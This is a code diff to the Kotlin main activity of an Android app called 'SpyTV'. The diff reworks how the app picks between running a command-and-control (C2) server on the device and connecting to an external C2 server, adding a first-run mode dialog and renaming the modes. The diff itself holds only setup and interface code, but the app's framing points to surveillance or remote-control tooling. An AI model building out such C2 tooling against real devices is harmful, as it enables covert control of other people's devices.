@@ -57,6 +57,7 @@ class MainActivity : AppCompatActivity() {
         const val PREFS = "spytv_console"
         const val KEY_URL = "c2_url"
         const val KEY_STANDALONE = "c2_standalone_mode"
+        const val KEY_FIRST_RUN = "first_run_complete"
         const val DEFAULT_URL = "http://localhost:8443/"
         const val BODY_LIMIT = 8192
         
@@ -86,11 +87,20 @@ class MainActivity : AppCompatActivity() {
         initViews()
         initPermissions()
         
-        // Check mode preference
-        isStandaloneMode = prefs.getBoolean(KEY_STANDALONE, false)
+        // Check if first run or has saved mode preference
+        isStandaloneMode = prefs.getBoolean(KEY_STANDALONE, true) // Default: Self-Hosted (standalone)
+        val firstRunComplete = prefs.getBoolean(KEY_FIRST_RUN, false)
+        
+        if (!firstRunComplete) {
+            // First run: show mode selection dialog
+            showModeSelectionDialog()
+            prefs.edit().putBoolean(KEY_FIRST_RUN, true).apply()
+        }
+        
         updateModeIndicator()
         
         if (isStandaloneMode) {
+            // Self-Hosted mode: run C2 server on-device
             // Check and request permissions first
             if (hasAllPermissions()) {
                 initC2Server()
@@ -98,12 +108,11 @@ class MainActivity : AppCompatActivity() {
                 requestPermissions()
             }
         } else {
-            // Console mode - ask for C2 address or use saved
+            // Connect-Remote mode: connect to external C2
             val saved = prefs.getString(KEY_URL, null)
             c2Url = saved?.takeIf { it.isNotBlank() } ?: DEFAULT_URL
             
             if (saved.isNullOrBlank()) {
-                // First run in console mode: ask where the C2 lives
                 promptForAddress()
             } else {
                 open(c2Url)
@@ -182,9 +191,9 @@ class MainActivity : AppCompatActivity() {
     
     private fun updateModeIndicator() {
         modeIndicator.text = if (isStandaloneMode) {
-            "STANDALONE C2 MODE"
+            "SELF-HOSTED MODE"
         } else {
-            "CONSOLE MODE"
+            "CONNECT-REMOTE MODE"
         }
         modeIndicator.setTextColor(
             if (isStandaloneMode) 0xFF10B981.toInt() else 0xFF3B82F6.toInt()
@@ -198,25 +207,24 @@ class MainActivity : AppCompatActivity() {
     
     private fun toggleStandaloneMode(enabled: Boolean) {
         if (enabled && !isStandaloneMode) {
-            // Switch to standalone mode
+            // Switch to Self-Hosted mode
+            isStandaloneMode = true
             if (hasAllPermissions()) {
                 initC2Server()
             } else {
                 requestPermissions()
                 return
             }
+            prefs.edit().putBoolean(KEY_STANDALONE, true).apply()
+            updateModeIndicator()
         } else if (!enabled && isStandaloneMode) {
-            // Switch to console mode
+            // Switch to Connect-Remote mode
             stopC2Server()
             isStandaloneMode = false
             prefs.edit().putBoolean(KEY_STANDALONE, false).apply()
             updateModeIndicator()
             promptForAddress()
         }
-        
-        isStandaloneMode = enabled
-        prefs.edit().putBoolean(KEY_STANDALONE, enabled).apply()
-        updateModeIndicator()
     }
     
     private fun initC2Server() {
@@ -363,7 +371,7 @@ class MainActivity : AppCompatActivity() {
             .setView(input)
             .setNegativeButton("Cancel") { _, _ ->
                 // Offer mode selection
-                showModeSelection()
+                showModeSelectionDialog()
             }
             .setPositiveButton("Connect") { _, _ ->
                 val url = normalize(input.text.toString())
@@ -378,55 +386,40 @@ class MainActivity : AppCompatActivity() {
             .show()
     }
     
-    private fun showModeSelection() {
-        val options = arrayOf("Console Mode: Connect to external C2", "Standalone Mode: Run C2 on this device")
+    private fun showModeSelectionDialog() {
+        val options = arrayOf("Self-Hosted (run C2 on this device)", "Connect-Remote (connect to external C2)")
         AlertDialog.Builder(this)
-            .setTitle("SpyTV Mode")
-            .setMessage("Choose how SpyTV should operate:")
+            .setTitle("Setup C2 Server")
+            .setMessage("Choose how SpyTV C2 should operate:\n\n" +
+                "• Self-Hosted: This device runs the full C2 server. Other devices connect to " +
+                "http://<this-device-ip>:8443/\n" +
+                "• Connect-Remote: Connect this device to an external C2 server\n")
             .setItems(options) { _, which ->
                 when (which) {
                     0 -> {
-                        isStandaloneMode = false
-                        prefs.edit().putBoolean(KEY_STANDALONE, false).apply()
-                        updateModeIndicator()
-                        promptForAddress()
-                    }
-                    1 -> {
                         isStandaloneMode = true
+                        prefs.edit().putBoolean(KEY_STANDALONE, true).apply()
+                        updateModeIndicator()
                         if (hasAllPermissions()) {
                             initC2Server()
                         } else {
                             requestPermissions()
                         }
-                        prefs.edit().putBoolean(KEY_STANDALONE, true).apply()
-                        updateModeIndicator()
                     }
-                }
-            }
-            .show()
-    }
-    
-    private fun showSettings() {
-        AlertDialog.Builder(this)
-            .setTitle("SpyTV Settings")
-            .setMessage("Standalone Mode: ${if (isStandaloneMode) "ENABLED" else "DISABLED"}\n\n" +
-                    "In Standalone mode, this APK runs its own C2 server.\n" +
-                    "In Console mode, it connects to an external C2 server.")
-            .setPositiveButton("Switch Mode") { _, _ ->
-                if (isStandaloneMode) {
-                    // Stop server and go to console mode
-                    stopC2Server()
-                    isStandaloneMode = false
-                    prefs.edit().putBoolean(KEY_STANDALONE, false).apply()
-                    updateModeIndicator()
-                    promptForAddress()
-                } else {
-                    // Ask which C2 to connect to
-                    promptForAddress()
+                    1 -> {
+                        isStandaloneMode = false
+                        prefs.edit().putBoolean(KEY_STANDALONE, false).apply()
+                        updateModeIndicator()
+                        promptForAddress()
+                    }
                 }
             }
             .setNegativeButton("Cancel", null)
             .show()
+    }
+    
+    private fun showSettings() {
+        showModeSelectionDialog()
     }
     
     /** Accept a bare host:port, force a scheme, require a host, normalise. */
